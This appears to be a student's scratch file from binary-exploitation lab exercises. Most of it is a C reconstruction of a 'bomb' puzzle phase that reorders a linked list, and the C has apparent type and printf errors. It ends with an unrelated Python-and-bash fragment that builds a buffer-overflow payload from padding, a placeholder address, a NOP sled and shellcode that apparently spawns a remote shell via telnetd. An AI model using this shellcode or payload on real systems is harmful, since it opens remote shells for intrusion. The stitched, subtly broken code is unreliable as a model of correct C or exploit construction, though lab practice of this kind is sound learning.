# include <stdlib.h>
# include <unistd.h>
# include <stdio.h>

void read_six_numbers(char *argv,int *param_2){
	int i;
	
	i = sscanf(argv,"%d %d %d %d %d %d",
					param_2,
					param_2 + 1,
					param_2 + 2,
					param_2 + 3,
					param_2 + 4,
					param_2 + 5);
	if (i < 6) {
		printf("boom read six nb \n");
	}
	return;	
}

typedef struct s_list {
	int	value;
	int	index;
	struct s_list *next;
} t_list;

t_list	*ft_lstlast(t_list *lst)
{
	while (lst != NULL)
	{
		if (lst->next == NULL)
			return (lst);
		lst = lst->next;
	}
	return (NULL);
}

void	ft_lstadd_back(t_list **lst, t_list *new)
{
	t_list	*stock;

	if (!lst || !new)
		return ;
	if (!(*lst))
		(*lst) = new;
	else
	{
		stock = ft_lstlast(*lst);
		stock->next = new;
	}
}

t_list	*ft_lstnew(int content, int index)
{
	t_list *lst;

	lst = NULL;
	lst = (t_list *)malloc(sizeof(t_list));
	if (!lst)
		return (NULL);
	lst->value = content;
	lst->index = index;
	lst->next = (NULL);

	return (lst);
}

void phase_6(char *param_1)
{
	int j;
	int i;
	int *tabl;
	t_list *tabl2;

	t_list *Node;
	int *node_addr[6];
	int array_input[6];

	
	Node = ft_lstnew(253, 1);
	ft_lstadd_back(&Node, ft_lstnew(725, 2));
	ft_lstadd_back(&Node, ft_lstnew(301, 3));
	ft_lstadd_back(&Node, ft_lstnew(997, 4));
	ft_lstadd_back(&Node, ft_lstnew(212, 5));
	ft_lstadd_back(&Node, ft_lstnew(432, 6));

	read_six_numbers(param_1,array_input);
	j = 0;

	//for(int i = 0; i < 6; i++)
	//	printf("%d \n",  array_input[i]);
	do {
		i = j;
    	if (5 < array_input[i] - 1U)
			printf("boom 1 \n");

		while (i = i + 1, i < 6){
			if (array_input[j] == array_input[i])
				printf("boom 2 \n");
		}
		j = j + 1;
	} while (j < 6);


	j = 0;
	do {
		i = 1;
		tabl2 = Node;
		printf("%ls", tabl2);
		if (1 < array_input[j]) {
			do {
				tabl2 = (int*)((t_list *)tabl2)->next;
				i = i + 1;
			} while (i < array_input[j]);
		}
		node_addr[j] = tabl2;
		j = j + 1;
	} while (j < 6);


	j = 1;
	tabl2 = node_addr[0];
	do {
		tabl = node_addr[j];
		((t_list *)tabl2)->next = (t_list *)tabl;
		j = j + 1;
		tabl2 = tabl;
	} while (j < 6);

	((t_list *)tabl2)->next = NULL;

	tabl[2] = 0;
	j = 0;
	do {
		if (*node_addr[0] < node_addr[0][2]) 
			printf("boom 3 \n");

		*node_addr[0] = node_addr[0][2];
		j = j + 1;
	} while (j < 5);
	return;
}

int	main(int ac, char **av){
	phase_6(av[1]);

	return 0;
}



NOP = '\x90' * 90
AAAA = 'A' * 90

adrr = '1234'

AAA = 'A%.0s' {1..90}

shellcode = "\x6c\x6e\x08\x3c\x74\x65\x08\x35\xec\xff\xa8"
shellcode += "\xaf\x64\x20\x09\x3c\x65\x74\x29\x35\xf0\xff"
shellcode += "\xa9\xaf\x20\x2f\x0a\x3c\x2d\x6c\x4a\x35\xf4"
shellcode += "\xff\xaa\xaf\x6e\x2f\x0b\x3c\x62\x69\x6b\x35"
shellcode += "\xf8\xff\xab\xaf\x73\x68\x0c\x24\xfc\xff\xac"
shellcode += "\xaf\xec\xff\xa4\x23\xec\xff\xbd\x23\xb4\x2a"
shellcode += "\x19\x3c\x50\xf0\x39\x37\x09\xf8\x20\x03\x32"
shellcode += "\x41\x61\x33"

final = AAAA + adrr + NOP + shellcode